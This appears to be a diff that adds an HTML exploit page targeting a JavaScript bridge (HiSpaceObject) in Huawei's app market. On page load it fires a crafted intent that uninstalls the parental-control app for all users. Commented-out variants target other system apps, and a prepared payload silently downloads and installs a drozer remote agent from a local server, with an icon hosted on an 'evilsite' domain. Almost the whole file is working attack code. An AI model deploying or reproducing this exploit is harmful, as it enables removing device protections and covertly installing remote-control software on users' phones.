@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+
+<script>
+setTimeout("getinfo()",20);
+function getinfo() {
+var uri = "intent:#Intent;S.uninstall_packagename=com.huawei.parentcontrol;B.uninstall_for_all_user=true;SEL;package=com.huawei.appmarket;component=com.huawei.appmarket/.support.pm.PackageUninstallerActivity;end";
+//var uri = "intent:#Intent;S.uninstall_packagename=com.android.settings;B.uninstall_for_all_user=true;SEL;package=com.huawei.appmarket;component=com.huawei.appmarket/.support.pm.PackageUninstallerActivity;end";
+//var uri="intent:#Intent;S.schemeUrl=https://edit.newrank.cn/detail.html?uuid=BEEBEE4D8AA685B61E7CACB078645FE6;SEL;component=com.huawei.health/com.huawei.health.MainActivity;end";
+<!-- var uri="intent://com.huawei.hiaction/launchapp?url=/sdcard/test.htm#Intent;scheme=hiaction;package=com.huawei.hiaction;component=com.huawei.hiaction/com.huawei.hiaction.central.forward.RouterActivity;action=android.intent.action.VIEW;end"; -->
+<!-- var uri = "intent:#Intent;package=com.huawei.gamebox;component=com.huawei.gamebox/.GameBoxActivity;end"; -->
+alert(/xss/);
+window.HiSpaceObject.launchApp(null,uri);
+var dataConfig = {
+                installStatus: 0,
+                isHuawei: true,
+                isWeiXinOrWeiBo: false,
+                installInfo: {
+                    url: "http://192.168.43.35:808/drozer.apk", //url必须有值且正确
+                    extendName: 'invalid',
+                    name: 'drozer Agent',
+                    packageName: 'com.mwr.dz', //和安装包名不符合时，会在桌面遗留一个“正在安装”的图标，重启后可移除
+                    callerName: 'invalid',
+                    size: '633111', //size必须有值且正确
+                    iconUrl: "http://www.evilsite.cn/images/favicon.png",
+                    version: "505",
+                    appId: "C10149090",
+                    md5: "D8970855A11C1A90DC9722718AE51209"
+                }
+            }
+            //调用华为应用市场HiSpaceObject.class中对外开放的startDownload( )接口，
+            //将json转化成string后传入，在json中必须包含的两个key有值且正确url、size。
+			//window.HiSpaceObject.startDownload(JSON.stringify(dataConfig.installInfo));
+}
+//document.location.href="http://www.vmall.com";
+</script>
+</body>
+</html>
